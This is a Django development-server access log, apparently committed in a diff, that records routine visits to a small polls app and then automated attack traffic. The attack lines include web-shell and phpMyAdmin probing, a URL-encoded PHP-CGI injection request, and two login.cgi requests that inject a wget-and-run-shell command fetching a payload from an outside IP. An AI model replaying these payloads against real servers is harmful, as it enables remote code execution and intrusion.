+[21/Jul/2018 21:12:23] "GET /static/polls/style_home.css HTTP/1.1" 200 839
+[21/Jul/2018 21:12:23] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:12:53] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:12:53] "GET /static/polls/style_home.css HTTP/1.1" 200 838
+[21/Jul/2018 21:12:53] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:12:54] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:12:54] "GET /static/polls/style_home.css HTTP/1.1" 200 838
+[21/Jul/2018 21:12:54] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:12:55] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:12:55] "GET /static/polls/style_home.css HTTP/1.1" 200 838
+[21/Jul/2018 21:12:55] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:13:19] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:13:19] "GET /static/polls/style_home.css HTTP/1.1" 200 831
+[21/Jul/2018 21:13:19] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:22:35] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:22:36] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 21:22:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:24:09] "GET /polls/home/ HTTP/1.1" 200 2018
+[21/Jul/2018 21:24:09] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 21:24:09] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:26:08] "GET /polls/home/ HTTP/1.1" 200 2022
+[21/Jul/2018 21:26:08] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 21:26:08] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:30:56] "GET /polls/home/ HTTP/1.1" 200 2016
+[21/Jul/2018 21:30:56] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 21:30:56] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:31:00] "GET /polls/home/ HTTP/1.1" 200 2016
+[21/Jul/2018 21:31:00] "GET /static/polls/style_home.css HTTP/1.1" 200 809
+[21/Jul/2018 21:31:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:31:30] "GET /polls/home/ HTTP/1.1" 200 2016
+[21/Jul/2018 21:31:30] "GET /static/polls/style_home.css HTTP/1.1" 200 830
+[21/Jul/2018 21:31:30] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:32:45] "GET /polls/home/ HTTP/1.1" 200 2016
+[21/Jul/2018 21:32:45] "GET /static/polls/style_home.css HTTP/1.1" 200 852
+[21/Jul/2018 21:32:45] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:33:23] "GET /polls/home/ HTTP/1.1" 200 2016
+[21/Jul/2018 21:33:23] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:33:23] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:35:07] "GET /polls/home/ HTTP/1.1" 200 2058
+[21/Jul/2018 21:35:07] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:35:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:35:43] "GET /polls/home/ HTTP/1.1" 200 2065
+[21/Jul/2018 21:35:44] "GET /static/polls/style_home.css HTTP/1.1" 200 833
+[21/Jul/2018 21:35:44] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:35:57] "GET /polls/home/ HTTP/1.1" 200 2065
+[21/Jul/2018 21:35:57] "GET /static/polls/style_home.css HTTP/1.1" 200 854
+[21/Jul/2018 21:35:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:40:36] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:40:36] "GET /static/polls/style_home.css HTTP/1.1" 200 854
+[21/Jul/2018 21:40:36] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:41:02] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:41:02] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:41:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:41:42] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:41:42] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:41:42] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:42:06] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:42:06] "GET /static/polls/style_home.css HTTP/1.1" 200 901
+[21/Jul/2018 21:42:06] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:42:07] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:42:07] "GET /static/polls/style_home.css HTTP/1.1" 200 901
+[21/Jul/2018 21:42:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:44:36] "GET /polls/home/ HTTP/1.1" 200 2334
+[21/Jul/2018 21:44:37] "GET /static/polls/style_home.css HTTP/1.1" 200 901
+[21/Jul/2018 21:44:37] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:44:38] "GET /polls/home/ HTTP/1.1" 200 2334
+[21/Jul/2018 21:44:38] "GET /static/polls/style_home.css HTTP/1.1" 200 901
+[21/Jul/2018 21:44:38] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:45:55] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:45:56] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:45:56] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:46:40] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:46:40] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:46:40] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:47:12] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:47:13] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:47:13] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:49:06] "GET /polls/home/ HTTP/1.1" 200 2367
+[21/Jul/2018 21:49:07] "GET /static/polls/style_home.css HTTP/1.1" 200 858
+[21/Jul/2018 21:49:07] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:51:02] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:51:02] "GET /static/polls/style_home.css HTTP/1.1" 200 883
+[21/Jul/2018 21:51:02] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:51:33] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:51:33] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:51:33] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:51:50] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:51:50] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:51:50] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:51:59] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:52:00] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:52:00] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:52:39] "GET /polls/home/ HTTP/1.1" 200 2318
+[21/Jul/2018 21:52:39] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:52:39] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:53:21] "GET /polls/home/ HTTP/1.1" 200 2329
+[21/Jul/2018 21:53:21] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:53:21] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:55:22] "GET /polls/home/ HTTP/1.1" 200 2345
+[21/Jul/2018 21:55:23] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:55:23] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:55:25] "GET /polls/home/ HTTP/1.1" 200 2345
+[21/Jul/2018 21:55:25] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:55:25] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:57:13] "GET /polls/home/ HTTP/1.1" 200 2329
+[21/Jul/2018 21:57:14] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:57:14] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:57:15] "GET /polls/home/ HTTP/1.1" 200 2329
+[21/Jul/2018 21:57:15] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:57:15] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:57:48] "GET /polls/home/ HTTP/1.1" 200 2343
+[21/Jul/2018 21:57:49] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:57:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:57:51] "GET /polls/home/ HTTP/1.1" 200 2343
+[21/Jul/2018 21:57:51] "GET /static/polls/style_home.css HTTP/1.1" 200 900
+[21/Jul/2018 21:57:51] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 21:59:29] "GET /polls/home/ HTTP/1.1" 200 2343
+[21/Jul/2018 21:59:29] "GET /static/polls/style_home.css HTTP/1.1" 200 923
+[21/Jul/2018 21:59:29] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:00:13] "GET /polls/home/ HTTP/1.1" 200 2359
+[21/Jul/2018 22:00:13] "GET /static/polls/style_home.css HTTP/1.1" 200 923
+[21/Jul/2018 22:00:13] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:01:46] "GET /polls/home/ HTTP/1.1" 200 2359
+[21/Jul/2018 22:01:47] "GET /static/polls/style_home.css HTTP/1.1" 200 983
+[21/Jul/2018 22:01:47] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[21/Jul/2018 22:03:18] "GET / HTTP/1.1" 404 2030
+[21/Jul/2018 22:05:56] "GET /polls/home/ HTTP/1.1" 200 2359
+[21/Jul/2018 22:05:57] "GET /static/polls/style_home.css HTTP/1.1" 200 1056
+[21/Jul/2018 22:05:57] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:06:47] "GET /polls/home/ HTTP/1.1" 200 2375
+[21/Jul/2018 22:06:47] "GET /static/polls/style_home.css HTTP/1.1" 200 1116
+[21/Jul/2018 22:06:47] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:07:14] "GET /polls/home/ HTTP/1.1" 200 2375
+[21/Jul/2018 22:07:15] "GET /static/polls/style_home.css HTTP/1.1" 200 1024
+[21/Jul/2018 22:07:15] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:09:49] "GET /polls/home/ HTTP/1.1" 200 2375
+[21/Jul/2018 22:09:49] "GET /static/polls/style_home.css HTTP/1.1" 200 1070
+[21/Jul/2018 22:09:49] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:10:45] "GET /polls/home/ HTTP/1.1" 200 2375
+[21/Jul/2018 22:10:45] "GET /static/polls/style_home.css HTTP/1.1" 200 1070
+[21/Jul/2018 22:10:45] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+[21/Jul/2018 22:10:58] "GET /polls/home/ HTTP/1.1" 200 2375
+[21/Jul/2018 22:10:59] "GET /static/polls/style_home.css HTTP/1.1" 200 1089
+[21/Jul/2018 22:10:59] "GET /static/polls/images/logo.jpg HTTP/1.1" 200 3727
+Not Found: /
+[21/Jul/2018 22:12:22] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[21/Jul/2018 22:20:12] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[21/Jul/2018 22:56:17] "GET / HTTP/1.1" 404 2030
+Invalid HTTP_HOST header: 'localhost'. You may need to add 'localhost' to ALLOWED_HOSTS.
+[21/Jul/2018 22:57:01] "PROPFIND / HTTP/1.1" 400 62891
+Not Found: /webdav/
+[21/Jul/2018 22:57:02] "GET /webdav/ HTTP/1.1" 404 2069
+Not Found: /wuwu11.php
+[21/Jul/2018 22:57:02] "POST /wuwu11.php HTTP/1.1" 404 2079
+Not Found: /xw.php
+[21/Jul/2018 22:57:03] "POST /xw.php HTTP/1.1" 404 2067
+Not Found: /xw1.php
+[21/Jul/2018 22:57:04] "POST /xw1.php HTTP/1.1" 404 2070
+Not Found: /9678.php
+[21/Jul/2018 22:57:04] "POST /9678.php HTTP/1.1" 404 2073
+Not Found: /wc.php
+[21/Jul/2018 22:57:05] "POST /wc.php HTTP/1.1" 404 2067
+Not Found: /xx.php
+[21/Jul/2018 22:57:05] "POST /xx.php HTTP/1.1" 404 2067
+Not Found: /s.php
+[21/Jul/2018 22:57:06] "POST /s.php HTTP/1.1" 404 2064
+Not Found: /w.php
+[21/Jul/2018 22:57:07] "POST /w.php HTTP/1.1" 404 2064
+Not Found: /sheep.php
+[21/Jul/2018 22:57:07] "POST /sheep.php HTTP/1.1" 404 2076
+Not Found: /db.init.php
+[21/Jul/2018 22:57:08] "POST /db.init.php HTTP/1.1" 404 2082
+Not Found: /db_session.init.php
+[21/Jul/2018 22:57:08] "POST /db_session.init.php HTTP/1.1" 404 2106
+Not Found: /db__.init.php
+[21/Jul/2018 22:57:09] "POST /db__.init.php HTTP/1.1" 404 2088
+Not Found: /mx.php
+[21/Jul/2018 22:57:09] "POST /mx.php HTTP/1.1" 404 2067
+Not Found: /wshell.php
+[21/Jul/2018 22:57:10] "POST /wshell.php HTTP/1.1" 404 2079
+Not Found: /xshell.php
+[21/Jul/2018 22:57:11] "POST /xshell.php HTTP/1.1" 404 2079
+Not Found: /qq.php
+[21/Jul/2018 22:57:11] "POST /qq.php HTTP/1.1" 404 2067
+Not Found: /conflg.php
+[21/Jul/2018 22:57:12] "POST /conflg.php HTTP/1.1" 404 2079
+Not Found: /lindex.php
+[21/Jul/2018 22:57:12] "POST /lindex.php HTTP/1.1" 404 2079
+Not Found: /phpstudy.php
+[21/Jul/2018 22:57:13] "POST /phpstudy.php HTTP/1.1" 404 2085
+Not Found: /weixiao.php
+[21/Jul/2018 22:57:14] "POST /weixiao.php HTTP/1.1" 404 2082
+Not Found: /feixiang.php
+[21/Jul/2018 22:57:14] "POST /feixiang.php HTTP/1.1" 404 2085
+Not Found: /ak47.php
+[21/Jul/2018 22:57:15] "POST /ak47.php HTTP/1.1" 404 2073
+Not Found: /xiao.php
+[21/Jul/2018 22:57:15] "POST /xiao.php HTTP/1.1" 404 2073
+Not Found: /yao.php
+[21/Jul/2018 22:57:16] "POST /yao.php HTTP/1.1" 404 2070
+Not Found: /defect.php
+[21/Jul/2018 22:57:17] "POST /defect.php HTTP/1.1" 404 2079
+Not Found: /webslee.php
+[21/Jul/2018 22:57:17] "POST /webslee.php HTTP/1.1" 404 2082
+Not Found: /q.php
+[21/Jul/2018 22:57:18] "POST /q.php HTTP/1.1" 404 2064
+Not Found: /pe.php
+[21/Jul/2018 22:57:18] "POST /pe.php HTTP/1.1" 404 2067
+Not Found: /hm.php
+[21/Jul/2018 22:57:19] "POST /hm.php HTTP/1.1" 404 2067
+Not Found: /xiaoma.php
+[21/Jul/2018 22:57:19] "POST /xiaoma.php HTTP/1.1" 404 2079
+Not Found: /qq.php
+[21/Jul/2018 22:57:20] "POST /qq.php HTTP/1.1" 404 2067
+Not Found: /data.php
+[21/Jul/2018 22:57:21] "POST /data.php HTTP/1.1" 404 2073
+Not Found: /log.php
+[21/Jul/2018 22:57:21] "POST /log.php HTTP/1.1" 404 2070
+Not Found: /fack.php
+[21/Jul/2018 22:57:22] "POST /fack.php HTTP/1.1" 404 2073
+Not Found: /angge.php
+[21/Jul/2018 22:57:22] "POST /angge.php HTTP/1.1" 404 2076
+Not Found: /index.php
+[21/Jul/2018 22:57:23] "GET /index.php HTTP/1.1" 404 2072
+Not Found: /phpmyadmin/index.php
+[21/Jul/2018 22:57:24] "GET /phpmyadmin/index.php HTTP/1.1" 404 2105
+Not Found: /phpMyAdmin/index.php
+[21/Jul/2018 22:57:25] "GET /phpMyAdmin/index.php HTTP/1.1" 404 2105
+Not Found: /pmd/index.php
+[21/Jul/2018 22:57:26] "GET /pmd/index.php HTTP/1.1" 404 2084
+Not Found: /pma/index.php
+[21/Jul/2018 22:57:31] "GET /pma/index.php HTTP/1.1" 404 2084
+Not Found: /PMA/index.php
+[21/Jul/2018 22:57:32] "GET /PMA/index.php HTTP/1.1" 404 2084
+Not Found: /PMA2/index.php
+[21/Jul/2018 22:57:32] "GET /PMA2/index.php HTTP/1.1" 404 2087
+Not Found: /pmamy/index.php
+[21/Jul/2018 22:57:33] "GET /pmamy/index.php HTTP/1.1" 404 2090
+Not Found: /pmamy2/index.php
+[21/Jul/2018 22:57:34] "GET /pmamy2/index.php HTTP/1.1" 404 2093
+Not Found: /mysql/index.php
+[21/Jul/2018 22:57:34] "GET /mysql/index.php HTTP/1.1" 404 2090
+Not Found: /admin/index.php
+[21/Jul/2018 22:57:35] "GET /admin/index.php HTTP/1.1" 404 4162
+Not Found: /db/index.php
+[21/Jul/2018 22:57:37] "GET /db/index.php HTTP/1.1" 404 2081
+Not Found: /dbadmin/index.php
+[21/Jul/2018 22:57:38] "GET /dbadmin/index.php HTTP/1.1" 404 2096
+Not Found: /web/phpMyAdmin/index.php
+[21/Jul/2018 22:57:39] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 2117
+Not Found: /admin/pma/index.php
+[21/Jul/2018 22:57:39] "GET /admin/pma/index.php HTTP/1.1" 404 4174
+Not Found: /admin/PMA/index.php
+[21/Jul/2018 22:57:40] "GET /admin/PMA/index.php HTTP/1.1" 404 4174
+Not Found: /admin/mysql/index.php
+[21/Jul/2018 22:57:41] "GET /admin/mysql/index.php HTTP/1.1" 404 4180
+Not Found: /admin/mysql2/index.php
+[21/Jul/2018 22:57:46] "GET /admin/mysql2/index.php HTTP/1.1" 404 4183
+Not Found: /admin/phpmyadmin/index.php
+[21/Jul/2018 22:57:48] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 4195
+Not Found: /admin/phpMyAdmin/index.php
+[21/Jul/2018 22:57:49] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 4195
+Not Found: /admin/phpmyadmin2/index.php
+[21/Jul/2018 22:57:49] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 4198
+Not Found: /mysqladmin/index.php
+[21/Jul/2018 22:57:50] "GET /mysqladmin/index.php HTTP/1.1" 404 2105
+Not Found: /mysql-admin/index.php
+[21/Jul/2018 22:57:51] "GET /mysql-admin/index.php HTTP/1.1" 404 2108
+Not Found: /phpadmin/index.php
+[21/Jul/2018 22:57:52] "GET /phpadmin/index.php HTTP/1.1" 404 2099
+Not Found: /phpmyadmin0/index.php
+[21/Jul/2018 22:57:53] "GET /phpmyadmin0/index.php HTTP/1.1" 404 2108
+Not Found: /phpmyadmin1/index.php
+[21/Jul/2018 22:57:53] "GET /phpmyadmin1/index.php HTTP/1.1" 404 2108
+Not Found: /phpmyadmin2/index.php
+[21/Jul/2018 22:57:57] "GET /phpmyadmin2/index.php HTTP/1.1" 404 2108
+Not Found: /myadmin/index.php
+[21/Jul/2018 22:57:58] "GET /myadmin/index.php HTTP/1.1" 404 2096
+Not Found: /myadmin2/index.php
+[21/Jul/2018 22:57:59] "GET /myadmin2/index.php HTTP/1.1" 404 2099
+Not Found: /xampp/phpmyadmin/index.php
+[21/Jul/2018 22:57:59] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 2123
+Not Found: /phpMyadmin_bak/index.php
+[21/Jul/2018 22:58:00] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 2117
+Not Found: /www/phpMyAdmin/index.php
+[21/Jul/2018 22:58:01] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 2117
+Not Found: /tools/phpMyAdmin/index.php
+[21/Jul/2018 22:58:02] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 2123
+Not Found: /phpmyadmin-old/index.php
+[21/Jul/2018 22:58:03] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 2117
+Not Found: /phpMyAdminold/index.php
+[21/Jul/2018 22:58:04] "GET /phpMyAdminold/index.php HTTP/1.1" 404 2114
+Not Found: /phpMyAdmin.old/index.php
+[21/Jul/2018 22:58:05] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 2117
+Not Found: /pma-old/index.php
+[21/Jul/2018 22:58:05] "GET /pma-old/index.php HTTP/1.1" 404 2096
+Not Found: /claroline/phpMyAdmin/index.php
+[21/Jul/2018 22:58:06] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 2135
+Not Found: /typo3/phpmyadmin/index.php
+[21/Jul/2018 22:58:07] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 2123
+Not Found: /phpma/index.php
+[21/Jul/2018 22:58:08] "GET /phpma/index.php HTTP/1.1" 404 2090
+Not Found: /phpmyadmin/phpmyadmin/index.php
+[21/Jul/2018 22:58:09] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 2138
+Not Found: /phpMyAdmin/phpMyAdmin/index.php
+[21/Jul/2018 22:58:10] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 2138
+Not Found: /
+[21/Jul/2018 23:20:34] "GET / HTTP/1.1" 404 2030
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 00:06:50] "GET / HTTP/1.0" 400 58444
+Not Found: /
+[22/Jul/2018 00:59:36] "GET / HTTP/1.1" 404 2030
+Invalid HTTP_HOST header: 'httpheader.net'. You may need to add 'httpheader.net' to ALLOWED_HOSTS.
+[22/Jul/2018 01:04:34] "GET http://httpheader.net/ HTTP/1.1" 400 59978
+[22/Jul/2018 01:05:09] code 400, message Bad request syntax ('\x04\x01\x00PÀcö60\x00')
+[22/Jul/2018 01:05:09] " PÀcö60 " 400 -
+Not Found: /
+[22/Jul/2018 01:05:38] "GET / HTTP/1.1" 404 2030
+[22/Jul/2018 01:05:39] code 400, message Bad request syntax ('\x05\x01\x00')
+[22/Jul/2018 01:05:39] " " 400 -
+Not Found: /
+[22/Jul/2018 01:12:30] "GET / HTTP/1.1" 404 2027
+Not Found: /index.action
+[22/Jul/2018 01:12:31] "GET /index.action HTTP/1.1" 404 2081
+Invalid HTTP_HOST header: '-c'. You may need to add '-c' to ALLOWED_HOSTS.
+[22/Jul/2018 01:17:16] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 400 65054
+Not Found: /
+[22/Jul/2018 02:03:12] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 02:15:10] "GET / HTTP/1.0" 404 2030
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 02:20:05] "GET / HTTP/1.0" 400 58443
+Not Found: /
+[22/Jul/2018 03:16:22] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 03:28:10] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 03:38:33] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 04:05:30] "GET / HTTP/1.1" 404 2031
+Not Found: /http://www.INKTRICKLE.com/
+[22/Jul/2018 04:05:31] "GET /http%3A%2F%2Fwww%2EINKTRICKLE%2Ecom%2F HTTP/1.1" 404 2127
+Not Found: /
+[22/Jul/2018 04:34:48] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 05:05:56] "GET / HTTP/1.1" 404 2030
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 06:08:08] "GET / HTTP/1.0" 400 58748
+Not Found: /
+[22/Jul/2018 06:17:44] "GET / HTTP/1.1" 404 2027
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 06:53:53] "GET / HTTP/1.0" 400 58444
+Not Found: /
+[22/Jul/2018 07:07:30] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 07:30:09] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 07:30:10] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 07:48:03] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[22/Jul/2018 07:53:35] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 08:00:40] "GET / HTTP/1.1" 404 2027
+Invalid HTTP_HOST header: 'localhost.localdomain'. You may need to add 'localhost.localdomain' to ALLOWED_HOSTS.
+[22/Jul/2018 08:25:36] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1" 400 60253
+Not Found: /
+[22/Jul/2018 08:25:36] "GET / HTTP/1.1" 404 2031
+Not Found: /
+[22/Jul/2018 08:55:44] "GET / HTTP/1.1" 404 2030
+Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+[22/Jul/2018 09:11:21] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 400 60199
+Not Found: /
+[22/Jul/2018 09:24:55] "GET / HTTP/1.1" 404 2030
+[22/Jul/2018 09:46:04] "GET /polls/home/ HTTP/1.1" 200 2375
+[22/Jul/2018 09:46:04] "GET /static/polls/style_home.css HTTP/1.1" 200 1089
+[22/Jul/2018 09:46:04] "GET /static/polls/images/logo.jpg HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[22/Jul/2018 09:46:04] "GET /favicon.ico HTTP/1.1" 404 2078
+Not Found: /
+[22/Jul/2018 09:56:04] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 09:56:10] "GET / HTTP/1.1" 404 2031
+[22/Jul/2018 09:57:12] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 09:57:33] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 09:57:35] "GET /polls/home/ HTTP/1.1" 200 2048
+Not Found: /
+[22/Jul/2018 10:00:05] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 10:00:06] "GET / HTTP/1.1" 404 2031
+Not Found: /
+[22/Jul/2018 10:00:09] "GET / HTTP/1.1" 404 2027
+Not Found: /
+[22/Jul/2018 10:00:10] "GET / HTTP/1.1" 404 2031
+Not Found: /
+[22/Jul/2018 10:00:12] "GET / HTTP/1.1" 404 2027
+[22/Jul/2018 10:00:14] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:16] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:17] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:17] "GET /polls/home/ HTTP/1.1" 200 2048
+[22/Jul/2018 10:00:18] "GET /polls/home/ HTTP/1.1" 200 2048
